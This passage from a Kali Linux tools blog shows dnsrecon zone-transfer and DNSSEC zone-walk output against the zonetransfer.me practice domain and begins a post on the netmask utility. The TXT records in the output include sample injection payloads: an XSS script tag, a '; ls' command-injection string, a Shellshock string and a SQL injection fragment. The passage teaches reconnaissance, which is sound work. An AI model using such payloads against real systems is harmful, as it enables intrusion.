<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d zonetransfer.me -a
</span><span class='line'>[*] Performing General Enumeration of Domain: zonetransfer.me
</span><span class='line'>[*] Checking for Zone Transfer for zonetransfer.me name servers
</span><span class='line'>[*] Resolving SOA Record
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*] Resolving NS Records
</span><span class='line'>[*] NS Servers found:
</span><span class='line'>[*]   NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]   NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*] Removing any duplicate NS server IP Addresses...
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 167.88.42.94
</span><span class='line'>[-] Zone Transfer Failed for 167.88.42.94!
</span><span class='line'>[-] Port 53 TCP is being filtered
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 81.4.108.41
</span><span class='line'>[*] 81.4.108.41 Has port 53 TCP Open
</span><span class='line'>[*] Zone Transfer was successful!!
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*]    NS intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    NS intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
</span><span class='line'>[*]    TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
</span><span class='line'>[*]    TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
</span><span class='line'>[*]    TXT AbCdEfG
</span><span class='line'>[*]    TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
</span><span class='line'>[*]    TXT ; ls
</span><span class='line'>[*]    TXT () { :]}; echo ShellShocked
</span><span class='line'>[*]    TXT ' or 1=1 --
</span><span class='line'>[*]    TXT Robin Wood
</span><span class='line'>[*]    PTR www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
</span><span class='line'>[*]    AAAA deadbeef.zonetransfer.me dead:beaf::
</span><span class='line'>[*]    AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
</span><span class='line'>[*]    A @.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A dc-office.zonetransfer.me 143.228.181.132
</span><span class='line'>[*]    A owa.zonetransfer.me 207.46.197.32
</span><span class='line'>[*]    A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A vpn.zonetransfer.me 174.36.59.154
</span><span class='line'>[*]    A email.zonetransfer.me 74.125.206.26
</span><span class='line'>[*]    A asfdbbox.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A canberra-office.zonetransfer.me 202.14.81.230
</span><span class='line'>[*]    A intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A office.zonetransfer.me 4.23.39.254
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
</span><span class='line'>[*]    SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
</span><span class='line'>[*]    HINFO Casio fx-700G Windows XP
</span><span class='line'>[*]    RP robin robinwood
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    LOC 53 20 56.558 N 1 38 33.526 W 0.00m
</span><span class='line'>[*]    NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
</span><span class='line'>[*]    NAPTR P 1 1  email.zonetransfer.me E2U+email
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
</span><span class='line'>[*]    DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
</span><span class='line'>[*]    NSEC _sip._tcp
</span><span class='line'>[*]    NSEC sqli
</span><span class='line'>[*]    NSEC vpn
</span><span class='line'>[*]    NSEC asfdbbox
</span><span class='line'>[*]    NSEC deadbeef
</span><span class='line'>[*]    NSEC intns1
</span><span class='line'>[*]    NSEC 157.177.147.217.IN-ADDR.ARPA
</span><span class='line'>[*]    NSEC asfdbauthdns
</span><span class='line'>[*]    NSEC dc-office
</span><span class='line'>[*]    NSEC alltcpportsopen.firewall.test
</span><span class='line'>[*]    NSEC canberra-office
</span><span class='line'>[*]    NSEC robinwood
</span><span class='line'>[*]    NSEC testing
</span><span class='line'>[*]    NSEC www
</span><span class='line'>[*]    NSEC Info
</span><span class='line'>[*]    NSEC dr
</span><span class='line'>[*]    NSEC @
</span><span class='line'>[*]    NSEC asfdbvolume
</span><span class='line'>[*]    NSEC xss
</span><span class='line'>[*]    NSEC email
</span><span class='line'>[*]    NSEC internal
</span><span class='line'>[*]    NSEC cmdexec
</span><span class='line'>[*]    NSEC intns2
</span><span class='line'>[*]    NSEC office
</span><span class='line'>[*]    NSEC contact
</span><span class='line'>[*]    NSEC owa
</span><span class='line'>[*]    NSEC staging
</span><span class='line'>[*]    NSEC sshock
</span><span class='line'>[*]    NSEC sip
</span><span class='line'>[*]    NSEC rp
</span><span class='line'>[*]    NSEC DZC
</span><span class='line'>[*]    NSEC ipv6actnow.org
</span><span class='line'>[*] Checking for Zone Transfer for zonetransfer.me name servers
</span><span class='line'>[*] Resolving SOA Record
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*] Resolving NS Records
</span><span class='line'>[*] NS Servers found:
</span><span class='line'>[*]   NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*]   NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*] Removing any duplicate NS server IP Addresses...
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 167.88.42.94
</span><span class='line'>[-] Zone Transfer Failed for 167.88.42.94!
</span><span class='line'>[-] Port 53 TCP is being filtered
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 81.4.108.41
</span><span class='line'>[*] 81.4.108.41 Has port 53 TCP Open
</span><span class='line'>[*] Zone Transfer was successful!!
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*]    NS intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    NS intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
</span><span class='line'>[*]    TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
</span><span class='line'>[*]    TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
</span><span class='line'>[*]    TXT AbCdEfG
</span><span class='line'>[*]    TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
</span><span class='line'>[*]    TXT ; ls
</span><span class='line'>[*]    TXT () { :]}; echo ShellShocked
</span><span class='line'>[*]    TXT ' or 1=1 --
</span><span class='line'>[*]    TXT Robin Wood
</span><span class='line'>[*]    PTR www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
</span><span class='line'>[*]    AAAA deadbeef.zonetransfer.me dead:beaf::
</span><span class='line'>[*]    AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
</span><span class='line'>[*]    A @.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A dc-office.zonetransfer.me 143.228.181.132
</span><span class='line'>[*]    A owa.zonetransfer.me 207.46.197.32
</span><span class='line'>[*]    A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A vpn.zonetransfer.me 174.36.59.154
</span><span class='line'>[*]    A email.zonetransfer.me 74.125.206.26
</span><span class='line'>[*]    A asfdbbox.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A canberra-office.zonetransfer.me 202.14.81.230
</span><span class='line'>[*]    A intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A office.zonetransfer.me 4.23.39.254
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
</span><span class='line'>[*]    SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
</span><span class='line'>[*]    HINFO Casio fx-700G Windows XP
</span><span class='line'>[*]    RP robin robinwood
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    LOC 53 20 56.558 N 1 38 33.526 W 0.00m
</span><span class='line'>[*]    NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
</span><span class='line'>[*]    NAPTR P 1 1  email.zonetransfer.me E2U+email
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
</span><span class='line'>[*]    DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
</span><span class='line'>[*]    NSEC _sip._tcp
</span><span class='line'>[*]    NSEC sqli
</span><span class='line'>[*]    NSEC vpn
</span><span class='line'>[*]    NSEC asfdbbox
</span><span class='line'>[*]    NSEC deadbeef
</span><span class='line'>[*]    NSEC intns1
</span><span class='line'>[*]    NSEC 157.177.147.217.IN-ADDR.ARPA
</span><span class='line'>[*]    NSEC asfdbauthdns
</span><span class='line'>[*]    NSEC dc-office
</span><span class='line'>[*]    NSEC alltcpportsopen.firewall.test
</span><span class='line'>[*]    NSEC canberra-office
</span><span class='line'>[*]    NSEC robinwood
</span><span class='line'>[*]    NSEC testing
</span><span class='line'>[*]    NSEC www
</span><span class='line'>[*]    NSEC Info
</span><span class='line'>[*]    NSEC dr
</span><span class='line'>[*]    NSEC @
</span><span class='line'>[*]    NSEC asfdbvolume
</span><span class='line'>[*]    NSEC xss
</span><span class='line'>[*]    NSEC email
</span><span class='line'>[*]    NSEC internal
</span><span class='line'>[*]    NSEC cmdexec
</span><span class='line'>[*]    NSEC intns2
</span><span class='line'>[*]    NSEC office
</span><span class='line'>[*]    NSEC contact
</span><span class='line'>[*]    NSEC owa
</span><span class='line'>[*]    NSEC staging
</span><span class='line'>[*]    NSEC sshock
</span><span class='line'>[*]    NSEC sip
</span><span class='line'>[*]    NSEC rp
</span><span class='line'>[*]    NSEC DZC
</span><span class='line'>[*]    NSEC ipv6actnow.org
</span><span class='line'>[-] A timeout error occurred please make sure you can reach the target DNS Servers
</span><span class='line'>[-] directly and requests are not being filtered. Increase the timeout from 3.0 second
</span><span class='line'>[-] to a higher number with --lifetime &lt;time&gt; option.</span></code></pre></td></tr></table></div></figure>


<p>Here we see some interesting records that might warrant an additional explanation:</p>

<p><strong>SOA</strong> &ndash; the State of Authority record indicates which DNS server is the best source of information for the specified domain</p>

<p><strong>HINFO</strong> specifies the host / server&rsquo;s type of CPU and operating system. We can see a Casio here, which is highly unlikely xD</p>

<p><strong>LOC</strong> &ndash; geolocation information, here in latitude / longitude values</p>

<p><strong>TXT</strong> &ndash; text records, with plenty of information like mail addresses, phone numbers, XSS and shellshock attempts</p>

<ul>
<li>map internal network with DNSSEC zone walk</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d zonetransfer.me -z
</span><span class='line'>[...]
</span><span class='line'>[*] Performing NSEC Zone Walk for zonetransfer.me
</span><span class='line'>[*] Getting SOA record for zonetransfer.me
</span><span class='line'>[*] Name Server 81.4.108.41 will be used
</span><span class='line'>[*]    A zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    SRV _sip._tcp.zonetransfer.me www.zonetransfer.me 217.147.177.157 5060 0
</span><span class='line'>[*]    A 157.177.147.217.IN-ADDR.ARPA.zonetransfer.me no_ip
</span><span class='line'>[*]    A asfdbauthdns.zonetransfer.me no_ip
</span><span class='line'>[*]    A asfdbbox.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A asfdbvolume.zonetransfer.me no_ip
</span><span class='line'>[*]    A canberra-office.zonetransfer.me 202.14.81.230
</span><span class='line'>[*]    A cmdexec.zonetransfer.me no_ip
</span><span class='line'>[*]    A contact.zonetransfer.me no_ip
</span><span class='line'>[*]    A dc-office.zonetransfer.me 143.228.181.132
</span><span class='line'>[*]    AAAA deadbeef.zonetransfer.me dead:beaf::
</span><span class='line'>[*]    A dr.zonetransfer.me no_ip
</span><span class='line'>[*]    A DZC.zonetransfer.me no_ip
</span><span class='line'>[*]    A email.zonetransfer.me 74.125.206.26
</span><span class='line'>[*]    A Info.zonetransfer.me no_ip
</span><span class='line'>[*]    A internal.zonetransfer.me no_ip
</span><span class='line'>[*]    A intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A office.zonetransfer.me 4.23.39.254
</span><span class='line'>[*]    AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
</span><span class='line'>[*]    A owa.zonetransfer.me 207.46.197.32
</span><span class='line'>[*]    A robinwood.zonetransfer.me no_ip
</span><span class='line'>[*]    A rp.zonetransfer.me no_ip
</span><span class='line'>[*]    A sip.zonetransfer.me no_ip
</span><span class='line'>[*]    A sqli.zonetransfer.me no_ip
</span><span class='line'>[*]    A sshock.zonetransfer.me no_ip
</span><span class='line'>[*]    A staging.zonetransfer.me 52.64.62.190
</span><span class='line'>[*]    A staging.zonetransfer.me 13.54.224.164
</span><span class='line'>[*]    A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    CNAME testing.zonetransfer.me www.zonetransfer.me
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A vpn.zonetransfer.me 174.36.59.154
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A xss.zonetransfer.me no_ip
</span><span class='line'>[*] 34 records found</span></code></pre></td></tr></table></div></figure>


<ul>
<li>sample CSV</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/tools/dnsrecon.png" title="dnsrecon" alt="dnsrecon CSV report"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ The only way to keep your health is to  \
</span><span class='line'>| eat what you don't want, drink what you |
</span><span class='line'>| don't like, and do what you'd rather    |
</span><span class='line'>| not.                                    |
</span><span class='line'>|                                         |
</span><span class='line'>\ -- Mark Twain                           /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[netmask - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools/"/>
    <updated>2017-07-07T05:55:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to convert between different types of netmasks and network addresses, or generate optimized netmasks for firewall rules. netmask can take care of your netmasks!</p>

<p>Homepage: <a href="https://github.com/tlby/netmask">https://github.com/tlby/netmask</a></p>

<!-- more -->


<h2>netmask description</h2>

<blockquote><p>This  program  accepts and produces a variety of common network address
and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to
generate the smallest list of rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
router  and  some  nasty  network administrator before you decided that
base 10 numbers were good places to start and end groups of machines.</p></blockquote>

<p>Manpage: <a href="https://linux.die.net/man/1/netmask">https://linux.die.net/man/1/netmask</a></p>

<h2>netmask options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
